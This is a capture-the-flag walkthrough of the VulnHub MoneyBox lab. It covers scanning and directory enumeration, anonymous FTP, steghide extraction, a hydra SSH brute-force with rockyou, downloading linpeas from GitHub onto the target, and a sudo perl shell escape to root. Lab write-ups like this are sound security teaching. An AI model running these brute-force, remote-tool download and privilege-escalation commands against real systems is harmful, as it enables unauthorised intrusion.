# Moneybox CTF Write-up

CTF link: 

[MoneyBox: 1](https://www.vulnhub.com/entry/moneybox-1,653/)

- We launched target machine and our kali and opened terminal as root.
- Check ifconfig and grab your ip address and start a scan.

> netdiscover -r xx.xx.xx.0/24
> 
- Pick the ip address and copy it.

We have to check ip for which ports runs which apps.

- First we check nmap

> nmap -sV -sC xx.x.x.x
> 

<p align="center"> <img src="assets/Untitled.png"> </p>

We see that our ip runs 3 ports: ftp, ssh,http.

We should check if there is a website and what we can find there. As usual page-source should be checked.

<p align="center"> <img src="assets/Untitled%201.png"> </p>

Also checked page-source, there is nothing there. So we should look for hidden directories.

> gobuster dir -u [http://192.168.1.6/](http://192.168.1.6/) -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
> 

<p align="center"> <img src="assets/Untitled%202.png"> </p>

Check this directories, don’t forget to check page-sources.

<p align="center"> <img src="assets/Untitled%203.png"> </p>

<p align="center"> <img src="assets/Untitled%204.png"> </p>

We check secret directory and its page-source given.

<p align="center"> <img src="assets/Untitled%205.png"> </p>

We found a secret key, probably a password. We had ftp and ssh port, we can try something. We should try to access ftp server as anonymous with no password first. Maybe we can find something.

<p align="center"> <img src="assets/Untitled%206.png"> </p>

We found a image file, and download it.

> get trytofind.jpg
> 

Maybe there is a hidden message in this image, because why not? We are trying everything.

> steghide extract -sf trytofind.jpg
> 

<p align="center"> <img src="assets/Untitled%207.png"> </p>

We entered found key “3xtr4ctd4t4” as passphrase and got a something. Check data.txt.

<p align="center"> <img src="assets/Untitled%208.png"> </p>

Password is weak and renu is the name. Let’s check ssh if we can find renu’s password with brute-force attack.

> hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.6
> 

<p align="center"> <img src="assets/Untitled%209.png"> </p>

We found renu’s password: “987654321”. Let’s enter ssh with these.

<p align="center"> <img src="assets/Untitled%2010.png"> </p>

We found the first flag. Look around.

<p align="center"> <img src="assets/Untitled%2011.png"> </p>

We found second flag. 

<p align="center"> <img src="assets/Untitled%2012.png"> </p>

We can not cd root, we have to be root. Other user lily maybe can, but password? We can look at linpeas. Download it to /tmp/ directory.

> wget [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
> 

<p align="center"> <img src="assets/Untitled%2013.png"> </p>

When we check all data we see that htere is authorized keys. Renu can login ssh as lily.

<p align="center"> <img src="assets/Untitled%2014.png"> </p>

> ssh lily@192.168.1.6
> 

<p align="center"> <img src="assets/Untitled%2015.png"> </p>

We login as lily and lily can run /usr/bin/perl as root. So we can get the shell with this. 

> Source: [https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/)
> 

> `sudo perl -e 'exec "/bin/sh";'`
> 

<p align="center"> <img src="assets/Untitled%2016.png"> </p>

Now we can cd root.

<p align="center"> <img src="assets/Untitled%2017.png"> </p>

All done.